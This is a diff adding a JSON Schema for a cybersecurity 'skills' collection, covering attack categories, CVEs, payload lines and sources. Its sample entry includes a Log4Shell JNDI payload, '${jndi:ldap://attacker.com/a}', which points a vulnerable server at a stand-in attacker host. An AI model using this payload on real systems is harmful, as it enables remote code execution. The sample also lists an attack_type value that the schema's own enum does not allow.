@@ -1,0 +1,285 @@
+{
+  "$schema": "http://json-schema.org/draft-07/schema#",
+  "$id": "https://hunter-skill.local/skill-schema/1.0.0.schema.json",
+  "title": "Hunter Skill Schema v1.0.0",
+  "description": "Standard schema for cybersecurity skills in the Hunter Skill project",
+  "type": "object",
+  "required": ["version", "metadata", "classification", "content", "context"],
+  "properties": {
+    "version": {
+      "type": "string",
+      "pattern": "^\\d+\\.\\d+\\.\\d+$",
+      "description": "Skill file version (semantic versioning)",
+      "default": "1.0.0",
+      "examples": ["1.0.0", "1.1.0", "2.0.0"]
+    },
+    "metadata": {
+      "type": "object",
+      "required": ["id", "schema_version", "created_at", "updated_at", "status"],
+      "properties": {
+        "id": {
+          "type": "string",
+          "pattern": "^[a-z0-9][a-z0-9-]*[a-z0-9]$",
+          "minLength": 5,
+          "maxLength": 100,
+          "description": "Unique identifier for the skill (lowercase, hyphens allowed)",
+          "examples": ["log4shell-cve-2021-44228", "sql-injection-blind", "mfa-bypass"]
+        },
+        "schema_version": {
+          "type": "string",
+          "pattern": "^\\d+\\.\\d+\\.\\d+$",
+          "description": "Schema version used (for migration purposes)",
+          "examples": ["1.0.0"]
+        },
+        "created_at": {
+          "type": "string",
+          "pattern": "^\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}Z$",
+          "description": "ISO 8601 timestamp when skill was created (UTC)",
+          "examples": ["2025-01-15T10:00:00Z"]
+        },
+        "updated_at": {
+          "type": "string",
+          "pattern": "^\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}Z$",
+          "description": "ISO 8601 timestamp when skill was last updated (UTC)",
+          "examples": ["2025-02-06T14:30:00Z"]
+        },
+        "status": {
+          "type": "string",
+          "enum": ["active", "deprecated", "retired", "draft"],
+          "description": "Current status of the skill",
+          "default": "active"
+        }
+      },
+      "additionalProperties": false
+    },
+    "classification": {
+      "type": "object",
+      "required": ["category"],
+      "properties": {
+        "category": {
+          "type": "string",
+          "minLength": 3,
+          "maxLength": 100,
+          "description": "Primary category (title case)",
+          "examples": [
+            "Account Takeover",
+            "API Key Leaks",
+            "CVE Exploits",
+            "Encoding Transformations",
+            "File Inclusion",
+            "Insecure Deserialization",
+            "LDAP Injection",
+            "Methodology and Resources"
+          ]
+        },
+        "subcategory": {
+          "type": "string",
+          "minLength": 3,
+          "maxLength": 100,
+          "description": "Optional secondary category for deeper classification"
+        },
+        "tags": {
+          "type": "array",
+          "minItems": 0,
+          "maxItems": 20,
+          "uniqueItems": true,
+          "items": {
+            "type": "string",
+            "pattern": "^[a-z0-9][a-z0-9-]*[a-z0-9]$",
+            "minLength": 2,
+            "maxLength": 50,
+            "description": "Searchable keywords (lowercase, hyphens allowed)"
+          },
+          "examples": [["authentication", "mfa-bypass", "web", "social-engineering"]]
+        },
+        "difficulty": {
+          "type": "string",
+          "enum": ["beginner", "intermediate", "advanced"],
+          "description": "Skill difficulty level",
+          "default": "intermediate"
+        },
+        "attack_type": {
+          "type": "array",
+          "minItems": 0,
+          "maxItems": 5,
+          "uniqueItems": true,
+          "items": {
+            "type": "string",
+            "enum": [
+              "reconnaissance",
+              "exploitation",
+              "post-exploitation",
+              "evasion",
+              "social-engineering",
+              "persistence",
+              "privilege-escalation",
+              "lateral-movement",
+              "defense-evasion"
+            ]
+          },
+          "examples": [["exploitation", "post-exploitation"]]
+        },
+        "cves": {
+          "type": "array",
+          "minItems": 0,
+          "maxItems": 10,
+          "uniqueItems": true,
+          "items": {
+            "type": "string",
+            "pattern": "^CVE-\\d{4}-\\d{4,}$",
+            "description": "Associated CVE identifiers"
+          },
+          "examples": [["CVE-2021-44228", "CVE-2021-44229"]]
+        }
+      },
+      "additionalProperties": false
+    },
+    "content": {
+      "type": "object",
+      "required": ["title", "payloads"],
+      "properties": {
+        "title": {
+          "type": "string",
+          "minLength": 3,
+          "maxLength": 200,
+          "description": "Skill title (clear and descriptive)",
+          "examples": ["MFA Bypass", "Log4Shell RCE", "SQL Injection Detection"]
+        },
+        "summary": {
+          "type": "string",
+          "minLength": 10,
+          "maxLength": 500,
+          "description": "Brief one-line summary of the skill"
+        },
+        "description": {
+          "type": "string",
+          "minLength": 20,
+          "description": "Comprehensive description of the skill"
+        },
+        "payloads": {
+          "type": "array",
+          "minItems": 1,
+          "items": {
+            "type": "string",
+            "description": "Lines of content that form the skill payload"
+          },
+          "description": "Array of content lines (can be reconstructed into markdown)"
+        }
+      },
+      "additionalProperties": false
+    },
+    "context": {
+      "type": "object",
+      "required": ["source"],
+      "properties": {
+        "source": {
+          "type": "string",
+          "minLength": 3,
+          "maxLength": 100,
+          "description": "Original source of the skill",
+          "examples": [
+            "PayloadsAllTheThings",
+            "HackTricks",
+            "h4cker",
+            "Original Research"
+          ]
+        },
+        "references": {
+          "type": "array",
+          "minItems": 0,
+          "items": {
+            "type": "object",
+            "required": ["title", "url"],
+            "properties": {
+              "title": {
+                "type": "string",
+                "minLength": 5,
+                "maxLength": 200,
+                "description": "Reference title or description"
+              },
+              "url": {
+                "type": "string",
+                "description": "URL to the reference material (must start with http:// or https://)"
+              },
+              "type": {
+                "type": "string",
+                "enum": ["github", "blog", "documentation", "tool", "pdf", "video", "academic", "other"],
+                "default": "other",
+                "description": "Type of reference"
+              },
+              "author": {
+                "type": "string",
+                "minLength": 1,
+                "maxLength": 100,
+                "description": "Original author (if applicable)"
+              },
+              "date": {
+                "type": "string",
+                "pattern": "^\\d{4}-\\d{2}-\\d{2}$",
+                "description": "Publication date (YYYY-MM-DD)"
+              }
+            },
+            "additionalProperties": false
+          },
+          "description": "Structured references to source material"
+        },
+        "author": {
+          "type": "string",
+          "minLength": 1,
+          "maxLength": 100,
+          "description": "Author or maintainer of the skill"
+        },
+        "license": {
+          "type": "string",
+          "minLength": 3,
+          "maxLength": 100,
+          "description": "License information",
+          "examples": ["MIT", "Apache 2.0", "GPL 3.0", "CC-BY-4.0"]
+        }
+      },
+      "additionalProperties": false
+    }
+  },
+  "additionalProperties": false,
+  "examples": [
+    {
+      "version": "1.0.0",
+      "metadata": {
+        "id": "log4shell-cve-2021-44228",
+        "schema_version": "1.0.0",
+        "created_at": "2025-01-15T10:00:00Z",
+        "updated_at": "2025-02-06T14:30:00Z",
+        "status": "active"
+      },
+      "classification": {
+        "category": "CVE Exploits",
+        "subcategory": "Java Vulnerabilities",
+        "tags": ["log4j", "rce", "critical", "java", "exploitation"],
+        "difficulty": "intermediate",
+        "attack_type": ["exploitation", "remote-code-execution"],
+        "cves": ["CVE-2021-44228", "CVE-2021-45046"]
+      },
+      "content": {
+        "title": "Log4Shell RCE",
+        "summary": "Apache Log4j JNDI injection vulnerability allowing remote code execution",
+        "description": "Apache Log4j2 <=2.14.1 contains a critical vulnerability that allows remote code execution through JNDI injection.",
+        "payloads": [
+          "# Log4Shell Payload",
+          "${jndi:ldap://attacker.com/a}"
+        ]
+      },
+      "context": {
+        "source": "PayloadsAllTheThings",
+        "references": [
+          {
+            "title": "Log4Shell POC",
+            "url": "https://github.com/projectdiscovery/nuclei-templates",
+            "type": "github"
+          }
+        ],
+        "author": "Security Researchers",
+        "license": "MIT"
+      }
+    }
+  ]
+}
